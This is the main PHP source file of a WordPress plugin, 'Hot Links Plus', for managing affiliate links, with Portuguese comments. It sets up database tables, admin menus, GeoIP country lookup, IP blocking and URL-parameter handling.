<?php

/*
Plugin Name: Hot Links Plus

Plugin URI: http://hotlinksplus.com

Description: Gerencie seus links de afiliados

Author: Anderson Makiyama

Version: 2.8.2

Author URI: http://hotlinksplus.com
*/

require_once('wp-updates-plugin.php');
new WPUpdatesPluginUpdater_1454( 'http://wp-updates.com/api/2/plugin', plugin_basename(__FILE__));


add_filter( 'auto_update_plugin', '__return_false' );

if(!function_exists('ereg_replace')){

	function ereg_replace($x,$y,$z){
		return preg_replace('/'.$x.'/', $y,$z);
	}	
	
}

class Anderson_Makiyama_Hot_Links_Plus{


	const CLASS_NAME = 'Anderson_Makiyama_Hot_Links_Plus';

	public static $CLASS_NAME = self::CLASS_NAME;

	const PLUGIN_ID = 101;

	public static $PLUGIN_ID = self::PLUGIN_ID;

	const PLUGIN_NAME = 'Hot Links Plus';

	public static $PLUGIN_NAME = self::PLUGIN_NAME;

	const PLUGIN_PAGE = 'http://hotlinksplus.com';

	public static $PLUGIN_PAGE = self::PLUGIN_PAGE;

	const PLUGIN_VERSION = '2.8.2';

	public static $PLUGIN_VERSION = self::PLUGIN_VERSION;
	
	const AUTHOR_SITE = 'hotlinksplus.com';

	public $plugin_basename;

	public $plugin_path;

	public $plugin_url;
	
	public $ids_no_refer = '';

	public function get_static_var($var) {

        return self::$$var;

    }

	public static function get_site_url(){
		
		$url_site = get_bloginfo("url");
		$url_site_array = explode("/",$url_site);
		$end = end($url_site_array);
		
		if($end != "/") $url_site.= "/";	
		
		if(strpos($url_site,'https://')===false){
			$is_secure = self::is_https();
			if($is_secure) $url_site = str_replace('http://','https://',$url_site);	
		}
		
		return $url_site;
		
	}
	
	public function activation(){
		global $wpdb, $anderson_makiyama;

		$options = get_option(self::CLASS_NAME . "_options");
		
		if(!isset($options['afiliados'])) $options['afiliados'] = array(); 
			
		update_option(self::CLASS_NAME . "_options", $options);
		
			
		$table_links = $wpdb->prefix . self::CLASS_NAME . "_links";
		$table_projetos = $wpdb->prefix . self::CLASS_NAME . "_proj";
		$table_acessos = $wpdb->prefix . self::CLASS_NAME . "_acess";
		$table_configs = $wpdb->prefix . self::CLASS_NAME . "_configs";
		$table_geoip = $wpdb->prefix . self::CLASS_NAME . "_geoip";
		$table_metricas = $wpdb->prefix . self::CLASS_NAME . "_metric";
		$table_geoipv6 = $wpdb->prefix . self::CLASS_NAME . "_geoipv6";

		//Cria Tabela Links
		$sql = "CREATE TABLE $table_links (
		  id_link bigint(20) NOT NULL AUTO_INCREMENT,
		  url_afiliado tinytext NOT NULL,
		  palavra_chave tinytext NOT NULL,
		  descricao text NOT NULL,
		  auto_create tinyint(1) NOT NULL,
		  auto_create_palavra tinytext NOT NULL,
		  popup int(2) NOT NULL,
		  popup_code text NOT NULL,
		  total_acessos int(11) NOT NULL,
		  face_pixel text NOT NULL,
		  nome_link tinytext NOT NULL,
		  max_replaces int(11) NOT NULL,
		  redirecionamento mediumint(9) NOT NULL,
		  popup_camuflagem text NOT NULL,
		  abrir_automatic int(2) NOT NULL,
		  url_automatic mediumtext NOT NULL,
		  ativar_automatic tinyint(1) NOT NULL,
		  segundos_apos_popup int(11) NOT NULL,
		  posicao_imagem_link int(2) NOT NULL,
		  segundos_apos_banner int(2) NOT NULL,
		  codigo_oculto text NOT NULL,
		  titulo varchar(300) NOT NULL,
		  imagem text NOT NULL,
		  descricao_publica text NOT NULL,
		  redirecionar varchar(300) NOT NULL,
		  ativar_cloak int(2) NOT NULL,
		  url_fora_br mediumtext NOT NULL,
		  url_no_br mediumtext NOT NULL,
		  id_projeto int(11) NOT NULL DEFAULT 1,
		  url_afiliado2 tinytext NOT NULL,
		  ativar_parametros_url tinyint(1) NOT NULL DEFAULT 1,
		  google_pixel text NOT NULL,
		  from_country varchar(5) NOT NULL DEFAULT 'BR',
		  total_acessos_unicos int(11) NOT NULL,
		  last_teste_ab int(2) NOT NULL DEFAULT 1,
		  url_afiliado3 tinytext NOT NULL,
		  ativar_metricas tinyint(1) NOT NULL,
		  ativar_rastreio_cookie tinyint(1) NOT NULL DEFAULT 1,
		  redir_apos int(11) NOT NULL DEFAULT 1,
		  so_ultima_origem tinyint(1) NOT NULL DEFAULT 0,
		  codigo_topo text NOT NULL,
		  redir_mensagem varchar(500) DEFAULT 'Carregando página, por favor aguarde...',
		  redir_gif tinyint(1) NOT NULL DEFAULT 1,
		  redir_codigo text NOT NULL,
		  ativar_share tinyint(1) NOT NULL,
		  share_gif tinyint(1) NOT NULL,
		  ativar_barra tinyint(1) NOT NULL,
		  ativar_contador tinyint(1) NOT NULL,
		  cor_barra varchar(7) NOT NULL,
		  cor_contador varchar(7) NOT NULL,
		  tempo_contador int(11) NOT NULL,
		  texto_barra varchar(100) NOT NULL,
		  texto_botao varchar(50) NOT NULL,
		  cor_texto_barra varchar(7) NOT NULL,
		  cor_texto_botao varchar(7) NOT NULL,
		  link_botao mediumtext NOT NULL,
		  cor_botao varchar(7) NOT NULL,
		  ativar_back_redir tinyint(1) NOT NULL,
		  url_back_redir tinytext NOT NULL,
		  mob_redir tinyint(1) NOT NULL,
		  link_banner tinytext NOT NULL,
		  ativar_intenc_sair tinyint(1) NOT NULL,
		  pop_intenc_sair text NOT NULL,
		  exibir_periodo tinyint(1) NOT NULL,
		  periodo_url tinytext NOT NULL,
		  dedata datetime NOT NULL,
		  atedata datetime NOT NULL,
		  url_intenc_sair tinytext NOT NULL,
		  tempo_barra int(11) NOT NULL,
		  from_country2 varchar(5) NOT NULL,
		  from_country3 varchar(5) NOT NULL,
		  from_country4 varchar(5) NOT NULL,
		  ativar_turbo tinyint(1) NOT NULL,
		  turbo_url tinytext NOT NULL,
		  redirect_clique tinyint(1) NOT NULL,
		  clique_url tinytext NOT NULL,
		  redirect_segundo tinyint(1) NOT NULL,
		  segundo_url tinytext NOT NULL,
		  passar_dispositivo tinyint(1) NOT NULL,
		  acao_cloak_br tinyint(1) NOT NULL,
		  acao_cloak_fora_br tinyint(1) NOT NULL,
		  segundos_apos_turbo int(11) NOT NULL,
		  tipo_modo int(1) NOT NULL,
		  turbo_img tinytext NOT NULL, 
		  UNIQUE KEY id_link (id_link)
		);";
		
		require_once( ABSPATH . 'wp-admin/includes/upgrade.php' );
		
		dbDelta( $sql );
				

		//Cria Tabela Projetos
		$sql = "CREATE TABLE $table_projetos (
		  id_projeto int(11) NOT NULL AUTO_INCREMENT,
		  nm_projeto tinytext NOT NULL,
		  descricao text NOT NULL,
		  UNIQUE KEY id_projeto (id_projeto)
		);";
		
		dbDelta( $sql );
		

		//Cria Tabela Acessos
		$sql = "CREATE TABLE $table_acessos (
		  id_acesso bigint(20) NOT NULL AUTO_INCREMENT,
		  id_link int(11) NOT NULL,
		  nome_link tinytext NOT NULL,
		  dt_acesso datetime NOT NULL,
		  link_completo tinytext NOT NULL,
		  dispositivo varchar(50) NOT NULL,
		  url_destino tinytext NOT NULL,
		  origem_acesso tinytext NOT NULL,
		  ip_acesso tinytext NOT NULL,
		  pais_acesso varchar(50) NOT NULL,
		  tracker_id text NOT NULL,
		  UNIQUE KEY id_acesso (id_acesso)
		);";
		
		dbDelta( $sql );
				
		//Cria Tabela Configs
		$sql = "CREATE TABLE $table_configs (
		  limite_acessos int(5) NOT NULL,
		  tipo_home int(5) NOT NULL,
		  url_home tinytext NOT NULL,
		  ips_bloqueados text NOT NULL,
		  ativar_webservices tinyint(1) NOT NULL DEFAULT 0,
		  acao_ip_sem tinyint(1) NOT NULL DEFAULT 0,
		  codigo_cabecalho text NOT NULL,
		  codigo_rodape text NOT NULL,
		  acao_mob tinyint(1) NOT NULL DEFAULT 0,
		  proj_padrao varchar(1) NOT NULL DEFAULT '1',
		  editar_nova_aba tinyint(1) NOT NULL DEFAULT 0,
		  apos_editar_voltar tinyint(1) NOT NULL DEFAULT 0,
		  param_google tinyint(1) NOT NULL DEFAULT 0,
		  acao_block tinyint(1) NOT NULL DEFAULT 0,
		  ids_no_refer text NOT NULL
		);";
		
		dbDelta( $sql );


		//Cria Tabela Metricas
		$sql = "CREATE TABLE $table_metricas (
		  id_link int(20) NOT NULL,
		  nm_link tinytext NOT NULL,
		  acesso_a int(20) NOT NULL,
		  acesso_b int(20) NOT NULL,
		  acesso_c int(20) NOT NULL,
		  conversao_a int(20) NOT NULL,
		  conversao_b int(20) NOT NULL,
		  conversao_c int(20) NOT NULL,
		  UNIQUE KEY id_link (id_link)	  
		);";
		
		dbDelta( $sql );		

		//Cria Tabela GeoIP
		$sql = "CREATE TABLE $table_geoip (
		begin_ip VARCHAR(15) NOT NULL DEFAULT '0.0.0.0',
		end_ip VARCHAR(15) NOT NULL DEFAULT '0.0.0.0',
		begin_num INT(10) UNSIGNED NOT NULL DEFAULT 0,
		end_num INT(10) UNSIGNED NOT NULL DEFAULT 0,
		country CHAR(2) NOT NULL DEFAULT '',
		name VARCHAR(50) NOT NULL DEFAULT '',
		PRIMARY KEY  (begin_num,end_num),
		KEY end_num (end_num)
		);";
		
		dbDelta( $sql );
				
		
		//Cria Tabela GeoIPv6
		$sql = "CREATE TABLE $table_geoipv6 (
		begin_ip VARCHAR(50) NOT NULL DEFAULT '0.0.0.0',
		end_ip VARCHAR(50) NOT NULL DEFAULT '0.0.0.0',
		begin_num varchar(50) NOT NULL,
		end_num varchar(50) NOT NULL,
		country CHAR(2) NOT NULL DEFAULT '',
		name VARCHAR(50) NOT NULL DEFAULT '',
		PRIMARY KEY  (begin_num,end_num),
		KEY end_num (end_num)
		);";
		
		dbDelta( $sql );
				
		
		$wpdb->query("update $table_acessos set tracker_id='old' where tracker_id=''");
							
				
		//Verifica se já tem projetos
		$projs = $wpdb->get_row(  
		"
			SELECT count(*) as total FROM $table_projetos
		", ARRAY_A );
		
		if($projs["total"]<1){//Não existe projeto, cadastra proj geral
			
			$default_nm = "Geral";
			$default_desc = "Links Gerais, que não estão em nenhum Projeto/Categoria";
			
			$wpdb->query( $wpdb->prepare( 
				"
				INSERT INTO $table_projetos
				(nm_projeto, descricao )
				VALUES ( %s, %s)
				", 
				$default_nm, 
				$default_desc
			) );			
			
		}
		//-------------------------------

		//Pega Configs
		$configs = $wpdb->get_row(  
		"
			SELECT count(*) as total FROM $table_configs
		", ARRAY_A );
		
		if($configs["total"]<1){//Não existe Configurações Ainda
			
			$default_limite_acessos = 0;
			$default_tipo_home = 0;//Normal
			$default_url_home = '';
			
			$wpdb->query( $wpdb->prepare( 
				"
				INSERT INTO $table_configs
				(limite_acessos, tipo_home, url_home )
				VALUES ( %d, %d, %s)
				", 
				$default_limite_acessos, 
				$default_tipo_home,
				$default_url_home
			) );			
			
		}
		//-------------------------------
				
		//Verifica se já tem ipv4
		$check_ipv4 = $wpdb->get_row(  
		"
			SELECT count(*) as total FROM $table_geoip LIMIT 1
		", ARRAY_A );
		
		if($check_ipv4["total"]<1){//Sem registros ainda
		
			// [import GeoIPCountry database IPV4] -------------------------------------
			
			/*
			$csv = NULL;
			is_file('includes/GeoIPCountryWhois.csv') and $csv = fopen('includes/GeoIPCountryWhois.csv', 'r'); // try raw file
			if (empty($csv) and function_exists('zip_open')) { // try zip archive directly from maxmind.com
				if (($zip = fopen('http://geolite.maxmind.com/download/geoip/database/GeoIPCountryCSV.zip', 'r'))) {
					$tmp_zip_name = tempnam(sys_get_temp_dir(), 'zip');
					if (($tmp_zip = fopen($tmp_zip_name, 'w'))) {
						if ( ! stream_copy_to_stream($zip, $tmp_zip)) {
							fclose($tmp_zip);
							unlink($tmp_zip_name);
						} else {
							fclose($tmp_zip);
							$csv = fopen('zip://' . $tmp_zip_name . '#GeoIPCountryWhois.csv', 'r');
						}
					}
					fclose($zip);
				}
			}
			*/
			
			if (empty($csv) and function_exists('gzopen')) { // try gz
				 is_file($anderson_makiyama[self::PLUGIN_ID]->plugin_path . 'includes/GeoIPCountryWhois.csv.gz') and ($csv = fopen('compress.zlib://' . $anderson_makiyama[self::PLUGIN_ID]->plugin_path . 'includes/GeoIPCountryWhois.csv.gz', 'r'));
			}
	
			if ($csv) {
				
				while ( ! feof($csv)) {
					$i = 0; $values = array();
					while (FALSE !== ($data = fgets($csv)) and $i < 10000) {
						$data = trim($data);
						if ('' != $data) {
							$values[] = '(' . $data . ')';
							$i++;
						}
					}
					if ($values) {
						$sql = 'INSERT INTO ' . $table_geoip . ' (begin_ip, end_ip, begin_num, end_num, country, name) VALUES ' . implode(',', $values);
						$wpdb->query($sql);
					}
						
				}
				fclose($csv);
			}
			/*if ( ! empty($tmp_zip_name) and is_file($tmp_zip_name)) { // Exclui o zip
				unlink($tmp_zip_name);
			}*/
			//Fim da Importação de geoip ipV4------------------
		
		}
		unset($check_ipv4);
		
		
		
		
		//Verifica se já tem ipv6
		$check_ipv6 = $wpdb->get_row(  
		"
			SELECT count(*) as total FROM $table_geoipv6 LIMIT 1
		", ARRAY_A );
		
		if($check_ipv6["total"]<1){//Sem registros ainda
		
			// [import GeoIPCountry database IPV6] -------------------------------------
			$csv = NULL;
	
			if (function_exists('gzopen')) { // try gz
				
				 is_file($anderson_makiyama[self::PLUGIN_ID]->plugin_path. 'includes/GeoIPv6.csv.gz') and ($csv = fopen('compress.zlib://' . $anderson_makiyama[self::PLUGIN_ID]->plugin_path . 'includes/GeoIPv6.csv.gz', 'r'));
				
			}		
					
			if ($csv) {
	
				while ( ! feof($csv)) {
					$i = 0; $values = array();
					while (FALSE !== ($data = fgets($csv)) and $i < 10000) {
						$data = trim($data);
						if ('' != $data) {
							$values[] = '(' . $data . ')';
							$i++;
						}
					}
					if ($values) {
						$sql = 'INSERT INTO ' . $table_geoipv6 . ' (begin_ip, end_ip, begin_num, end_num, country, name) VALUES ' . implode(',', $values);
						$wpdb->query($sql);
						
						//$wpdb->show_errors(); 
						//$wpdb->print_error();
					}
				}
				fclose($csv);
			}
			//Fim da Importação de geoip ipV6------------------		
			
		}
		unset($check_ipv6);

	}

	
	public function __construct(){ //Anderson_Makiyama_Hot_Links_Plus(){


		$this->plugin_basename = plugin_basename(__FILE__);

		$this->plugin_path = dirname(__FILE__) . "/";

		$this->plugin_url = WP_PLUGIN_URL . "/" . basename(dirname(__FILE__)) . "/";
		
		if(strpos($this->plugin_url,'https://')===false){
			if(self::is_https()) $this->plugin_url = str_replace('http://','https://',$this->plugin_url);
		}

		load_plugin_textdomain( self::CLASS_NAME, false, strtolower(str_replace(" ","-",self::PLUGIN_NAME)) . '/lang' );
		
		$options = get_option(self::CLASS_NAME . "_options");
		
		if(!isset($options["current_version"]) || $options["current_version"] != self::PLUGIN_VERSION){//Precisa Atualizar Banco
		
			$options["current_version"] = self::PLUGIN_VERSION;
			update_option(self::CLASS_NAME."_options", $options);
			
			$this->activation();
		
		}		
		
		//$this->activation();


	}
	

	public static function settings_link($links) { 

		global $anderson_makiyama;

		$settings_link = '<a href="options-general.php?page='. self::CLASS_NAME .'">'. __('Settings',self::CLASS_NAME) . '</a>'; 

		array_unshift($links, $settings_link); 

		return $links; 

	}	

	public static function wrap32($x) {
		return $x + ($x < 0 ? 4294967296 : 0);
	}
	
	public static function get_country_code($ip, $ativar_webservices=0){
		global $wpdb;
		
		$table_geoip = $wpdb->prefix . self::CLASS_NAME . "_geoip";
		$table_geoipv6 = $wpdb->prefix . self::CLASS_NAME . "_geoipv6";
		
		require_once('includes/geoplugin.class.php');
		$is_ip_v6 = filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6);
		
		if($is_ip_v6) {//é ipv6

			$result = 0;
			foreach (str_split(bin2hex(inet_pton($ip)), 8) as $word) {
				$result = bcadd(bcmul($result, '4294967296', 0), self::wrap32(hexdec($word)), 0);
			}
	
			$country = $wpdb->get_row($wpdb->prepare("SELECT country FROM $table_geoipv6
			WHERE begin_num <= %s AND end_num >= %s",
			$result,$result
			), ARRAY_A);
				
		}else{
		
			$ip_to_long = $ip;
	
			is_string($ip_to_long) and $ip_to_long = ip2long($ip_to_long);
			$sip = sprintf('%u', $ip_to_long);	
	
			$country = $wpdb->get_row($wpdb->prepare("SELECT country FROM $table_geoip
			WHERE begin_num <= %s AND end_num >= %s",
			$sip,$sip
			), ARRAY_A);
		
		}	
				
		if(!$country){
			 $country = "sem";
			
			if($ativar_webservices == 1 && !$is_ip_v6){	
			
				//Pega Código do País pela Classe, direto do site
				$geoplugin = new geoPlugin_Hot_Links_Plus();
				$geoplugin->locate($ip);
				$var_country_code = $geoplugin->countryCode;
				
				if(!empty($var_country_code)) $country = $var_country_code;
				unset($geoplugin);
			
			}
		}else{
			$country = $country["country"];	
		}

		return $country;
		
	}

	public static function ip_in_range( $ip, $range ) {
		if ( strpos( $range, '/' ) == false ) {
			$range .= '/32';
		}
		// $range is in IP/CIDR format eg 127.0.0.1/24
		list( $range, $netmask ) = explode( '/', $range, 2 );
		$range_decimal = ip2long( $range );
		$ip_decimal = ip2long( $ip );
		$wildcard_decimal = pow( 2, ( 32 - $netmask ) ) - 1;
		$netmask_decimal = ~ $wildcard_decimal;
		return ( ( $ip_decimal & $netmask_decimal ) == ( $range_decimal & $netmask_decimal ) );
	}

	public static function is_blocked_ip($ip, $ips_bloqueados){
		
		foreach($ips_bloqueados as $ip_bloqueado){
			
			if(strpos($ip_bloqueado,'/')!==false){//É Range de IP
			
				return self::ip_in_range($ip, $ip_bloqueado);
				 
			}else{//Não é Range, Faz Comparação normal
				
				if($ip == $ip_bloqueado) return true;
			}
		
		}
		
		return false;//Se chegou até aqui é pq não está bloqueado
		
	}

	public static function options(){


		global $anderson_makiyama;

		//wp_get_current_user(); //get_currentuserinfo();

		if (function_exists('add_options_page')) { //Adiciona pagina na seção Configurações

			add_options_page(self::PLUGIN_NAME, self::PLUGIN_NAME,'activate_plugins', self::CLASS_NAME, array(self::CLASS_NAME,'add_links_page'));

		}

		if (function_exists('add_submenu_page')){ //Adiciona pagina na seção plugins

			add_submenu_page( "plugins.php",self::PLUGIN_NAME,self::PLUGIN_NAME,'activate_plugins', self::CLASS_NAME, array(self::CLASS_NAME,'add_links_page'));			  

		}

  		 add_menu_page(self::PLUGIN_NAME, self::PLUGIN_NAME,'activate_plugins', self::CLASS_NAME,array(self::CLASS_NAME,'add_links_page'), plugins_url('/images/icon.png', __FILE__));
		 
		 add_submenu_page(self::CLASS_NAME, self::PLUGIN_NAME,"Projetos/Categorias",'activate_plugins', self::CLASS_NAME . "_Projetos", array(self::CLASS_NAME,'projetos_page'));

		 add_submenu_page(self::CLASS_NAME, self::PLUGIN_NAME,__('My Links',self::CLASS_NAME),'activate_plugins', self::CLASS_NAME . "_Links", array(self::CLASS_NAME,'links_page'));
		 		 
		 add_submenu_page(self::CLASS_NAME, self::PLUGIN_NAME,__('Report',self::CLASS_NAME),'activate_plugins', self::CLASS_NAME . "_Report", array(self::CLASS_NAME,'report_page'));
		 
		 add_submenu_page(self::CLASS_NAME, self::PLUGIN_NAME,'Metricas A/B','activate_plugins', self::CLASS_NAME . "_Metricas", array(self::CLASS_NAME,'metricas_page'));
		 
		 add_submenu_page(self::CLASS_NAME, self::PLUGIN_NAME,'Configurações','activate_plugins', self::CLASS_NAME . "_Configs", array(self::CLASS_NAME,'configs_page'));
		 
		 global $submenu;
		 if ( isset( $submenu[self::CLASS_NAME] ) )
			$submenu[self::CLASS_NAME][0][0] = __('Add Links',self::CLASS_NAME);

	}	

	
	public static function add_links_page(){

		include("includes/countries.php");
		include("templates/addlinks.php");

	}
	
	public static function configs_page(){

		include("templates/configs.php");

	}		
	
	public static function projetos_page(){

		if(isset($_REQUEST["idproj"])){
			include("templates/edit-projeto.php");
		}else{
			include("templates/projetos.php");
		}
	}			

	public static function check_post_slug( $slug, $post_ID, $post_status, $post_type, $post_parent, $original_slug){
		
		global $wpdb;
		
		$options = get_option(self::CLASS_NAME . "_options");
			
		$serial_afiliados = serialize($options['afiliados']);
		
		if(strpos($serial_afiliados,'"'.$slug.'"') !== false){

			$suffix = 2;
			do {
				$alt_post_name = _truncate_post_slug( $slug, 200 - ( strlen( $suffix ) + 1 ) ) . "-$suffix";
				$post_name_check = $wpdb->get_var( $wpdb->prepare( $check_sql, $alt_post_name, $post_ID, $post_parent ) );
				$suffix++;
				
				if(strpos($serial_afiliados,'"'.$alt_post_name.'"') !== false) $post_name_check = "alguma coisa";
				
			} while ( $post_name_check );
			
			$slug = $alt_post_name;

		}
		
		return $slug;
						
	}


	public static function report_page(){

		include("templates/report.php");

	}	
	
	public static function metricas_page(){

		include("templates/metricasabc.php");

	}			

	public static function links_page(){

		if(isset($_REQUEST["lk"])){
			include("includes/countries.php");	
			include("templates/edit-link.php");	
		}else{
			include("templates/links.php");
		}

	}	
	
	public static function make_data($data, $anoConta,$mesConta,$diaConta){

	   $ano = substr($data,0,4);
	   $mes = substr($data,5,2);
	   $dia = substr($data,8,2);
	   
	   $dia_org = $dia;

		//Controle para arrumar dias dos Meses
	   $meses_31 = array("01", "03", "05", "07", "08", "10", "12");
	   $meses_30 = array("04", "06", "09", "11");
	   $meses_28 = array("02");
	   
	   /*	   
	   if($mesConta !=0){//Vai mudar o Mês, precisa Conferir
			
			$calculo_mes = $mes+($mesConta);
			
			$novo_mes = $calculo_mes;
			   		
			if($calculo_mes > 12){
				
				$novo_mes = $calculo_mes % 12;
				
				if($novo_mes == 0) $novo_mes = 1;
				
			}elseif($calculo_mes < 1){
					
				$calculo_mes = abs($calculo_mes);
				
				if($calculo_mes > 11) $calculo_mes = $calculo_mes % 12;
				
				$novo_mes = 12 - $calculo_mes;
				
			}
			
			

			if( in_array($novo_mes,$meses_30)){
				
				if($dia > 30) $dia = 30; 
				
			}elseif(in_array($novo_mes,$meses_28)){
				
				if($dia > 28){ $dia = 28;} 
				
			}
			
					   
	   }
		*/
	   
	   // Para não ter Problema com Fevereiro
	   /*
	   if($anoConta != 0 && in_array($mes,$meses_28)){
			$dia = 28;   
	   }
		*/
	   //-------------------		
	   
	  	$nova_data = date('Y-m-d',mktime (0, 0, 0, $mes+($mesConta), $dia+($diaConta), $ano+($anoConta)));		
		
		$data_array = self::get_data_array($nova_data);
		
		/*
		//
		if($dia_org>28){
			
			if(date('L', strtotime($nova_data))){//É ano Bissesto, seta fevereiro corretamente
				
				if(in_array($data_array["mes"],$meses_28)) $data_array["dia"] = 29;
			
			}else{
				
				if(in_array($data_array["mes"],$meses_28)){
					 $data_array["dia"] = 28;
				}elseif(in_array($data_array["mes"],$meses_30) && $dia_org > 30){
					 $data_array["dia"] = 30;
				}
					
			}
			
		}else{
			$data_array["dia"] = $dia_org;	
		}
		//----------------------------
		*/
		
		return implode("-",$data_array);

	}


	public static function log_views(){
		
		include_once("includes/Mobile_Detect.php");
		include("includes/log_views.php");
	}
	


	public static function admin_estilos($hook) {
		
		if(strpos($hook,self::CLASS_NAME) === false) return;
		
		
		wp_register_style(self::CLASS_NAME . '_admin_css', plugins_url('css/admin.css', __FILE__), array(), self::PLUGIN_VERSION, 'all');
		wp_enqueue_style(self::CLASS_NAME . '_admin_css');
		
		wp_register_style(self::CLASS_NAME . '_admin_bootstrap_css', plugins_url('css/bootstrap.min.css', __FILE__), array(), self::PLUGIN_VERSION, 'all');
		wp_enqueue_style(self::CLASS_NAME . '_admin_bootstrap_css');
	 
	 
		wp_register_style(self::CLASS_NAME . '_admin_dataTable_css', plugins_url('css/bootstrap-table.css', __FILE__), array(), self::PLUGIN_VERSION, 'all');
		wp_enqueue_style(self::CLASS_NAME . '_admin_dataTable_css');
		
		wp_register_style(self::CLASS_NAME . '_admin_awsomefonts_css', plugins_url('css/font-awesome.min.css', __FILE__), array(), self::PLUGIN_VERSION, 'all');
		wp_enqueue_style(self::CLASS_NAME . '_admin_awsomefonts_css');
		
		wp_register_style(self::CLASS_NAME . '_admin_morris_css', plugins_url('css/morris-0.5.1.css', __FILE__), array(), self::PLUGIN_VERSION, 'all');
		wp_enqueue_style(self::CLASS_NAME . '_admin_morris_css');
		
		wp_register_style(self::CLASS_NAME . '_admin_jquery_ui_css', plugins_url('css/jquery-ui.css', __FILE__), array(), self::PLUGIN_VERSION, 'all');
		wp_enqueue_style(self::CLASS_NAME . '_admin_jquery_ui_css');
		
		wp_register_style(self::CLASS_NAME . '_admin_jquery_ui_timepicker_css', plugins_url('css/jquery.datetimepicker.css', __FILE__),array(),self::PLUGIN_VERSION);
		wp_enqueue_style(self::CLASS_NAME . '_admin_jquery_ui_timepicker_css');
				
		
		
		

	}
	
	public static function get_query_sem_google_params($google_parametros,$query_string_array){
		
		foreach($google_parametros as $google_param){
				
			if(isset($query_string_array[$google_param])){
				
				unset($query_string_array[$google_param]);
			
			}
						
		}
		
		return $query_string_array;
					
	}
	
	public static function get_urls_com_parametros($url,$query_string_array,$nome_do_parametro,$configs,$google_parametros){
		
		$url_final = $url;
		
		if(strpos($url, "?") !==false){//Existem Parametros, precisa forçar junção
			
			$posicao_interrogacao = strpos($url,'?');
			
			$url_destino_params = substr($url, $posicao_interrogacao+1);
			
			$url_destino_clean = substr($url,0, $posicao_interrogacao);
			
			parse_str(html_entity_decode($url_destino_params), $query_string_array_url_destino);
			
			$params_final_array = self::array_concat( $query_string_array_url_destino, $query_string_array);
			
			if($configs["param_google"] == 3 && isset($params_final_array[$nome_do_parametro])){//Ocultar SRC Inteiro
				
				$params_final_array[$nome_do_parametro] = 'hlp_trackerid';
				$params_final_array = self::get_query_sem_google_params($google_parametros,$params_final_array);
				
				
			}
			
			$query_string_final = urldecode(http_build_query($params_final_array,'','&'));
			$url_final = $url_destino_clean . "?" . $query_string_final;
			
			
		}else{


			if($configs["param_google"] == 3 && isset($query_string_array[$nome_do_parametro])){//Ocultar SRC Inteiro
				
				$query_string_array[$nome_do_parametro] = 'hlp_trackerid';
				$query_string_array = self::get_query_sem_google_params($google_parametros,$query_string_array);
				
			}
			
						
			$query_string_final = urldecode(http_build_query($query_string_array,'','&'));
			$url_final .= 	'?' . $query_string_final;
			
		}	
		
		return $url_final;
					
	}
	
	public static function get_ids_no_refer(){
		global $wpdb,$anderson_makiyama,$post;
		
		$table_configs = $wpdb->prefix . self::CLASS_NAME . "_configs";
		
		//Verifica se já tem projetos
		$configs = $wpdb->get_row(  
		"
			SELECT ids_no_refer FROM $table_configs
		", ARRAY_A );
			
		$ids_no_refer = explode(",",$configs["ids_no_refer"]);	
		$anderson_makiyama[self::PLUGIN_ID]->ids_no_refer = $ids_no_refer;
		
		return $ids_no_refer;	
	}
	
	public static function estilos() {
		global $anderson_makiyama,$post;

		$ids_no_refer = $anderson_makiyama[self::PLUGIN_ID]->ids_no_refer;
		
		if(!is_array($ids_no_refer)){
			$ids_no_refer = self::get_ids_no_refer();
		}
		
		
        if(!defined('OP_LIVEEDITOR') && !in_array($post->ID,$ids_no_refer) ) wp_enqueue_style( self::CLASS_NAME . "_estilos", $anderson_makiyama[self::PLUGIN_ID]->plugin_url  ."css/jquery.fancybox.css",self::PLUGIN_VERSION);
		
		
    }
	
	public static function js() {
		
		global $anderson_makiyama,$post;

		$ids_no_refer = $anderson_makiyama[self::PLUGIN_ID]->ids_no_refer;
		
		if(!is_array($ids_no_refer)){
			$ids_no_refer = self::get_ids_no_refer();
		}
				
		//wp_deregister_script('jquery-1.1.11');
		
		if(!defined('OP_LIVEEDITOR') && !in_array($post->ID,$ids_no_refer)){
			
			wp_register_script( "jquery-1.11.1.js", $anderson_makiyama[self::PLUGIN_ID]->plugin_url . 'js/jquery-1.11.1.js',array(),self::PLUGIN_VERSION );
			
			wp_enqueue_script( "jquery-1.11.1.js" );
			
			wp_enqueue_script( self::CLASS_NAME . "_js_mousewheel", $anderson_makiyama[self::PLUGIN_ID]->plugin_url . 'js/jquery.mousewheel-3.0.6.pack.js', array('jquery-1.11.1.js'),self::PLUGIN_VERSION );
					
			wp_enqueue_script( self::CLASS_NAME . "_js_fancybox", $anderson_makiyama[self::PLUGIN_ID]->plugin_url . 'js/jquery.fancybox.js', array('jquery-1.11.1.js'),self::PLUGIN_VERSION );
			
			wp_enqueue_script( self::CLASS_NAME . "_js_auto_links", $anderson_makiyama[self::PLUGIN_ID]->plugin_url . 'js/auto-link.js', array('jquery-1.11.1.js'),self::PLUGIN_VERSION,true );
			
			wp_enqueue_script( self::CLASS_NAME . "_js_hot-parameters", $anderson_makiyama[self::PLUGIN_ID]->plugin_url . 'js/hot-parameters.js',array('jquery-1.11.1.js'),self::PLUGIN_VERSION );
						
		}

	}	
		
	public static function admin_js($hook) {
		
		global $anderson_makiyama;
		
		if(strpos($hook,self::CLASS_NAME) === false ) return;

		//wp_enqueue_script( self::CLASS_NAME . "jquery-2.2.1", $anderson_makiyama[self::PLUGIN_ID]->plugin_url . 'js/jquery-2.2.1.min.js' );
		
		//wp_deregister_script('jquery');
		//wp_register_script('jquery', ("http://code.jquery.com/jquery-latest.min.js"), false, '');
		//wp_enqueue_script('jquery');
				
		wp_enqueue_media();
					
		wp_register_script( self::CLASS_NAME . "admin_datatable_js", $anderson_makiyama[self::PLUGIN_ID]->plugin_url . 'js/bootstrap-table.js', array("jquery"),self::PLUGIN_VERSION );	 
		wp_enqueue_script( self::CLASS_NAME . "admin_datatable_js" );
		
		wp_register_script( self::CLASS_NAME . "admin_bootstrap_js", $anderson_makiyama[self::PLUGIN_ID]->plugin_url . 'js/bootstrap.min.js',array(),self::PLUGIN_VERSION );
		wp_enqueue_script( self::CLASS_NAME . "admin_bootstrap_js");
		
		wp_register_script( self::CLASS_NAME . "admin_morris_js", $anderson_makiyama[self::PLUGIN_ID]->plugin_url . 'js/morris.min.js',array(),self::PLUGIN_VERSION );
		wp_enqueue_script( self::CLASS_NAME . "admin_morris_js" );

		wp_register_script( self::CLASS_NAME . "admin_raphael_js", $anderson_makiyama[self::PLUGIN_ID]->plugin_url . 'js/raphael-min.js',array(),self::PLUGIN_VERSION );
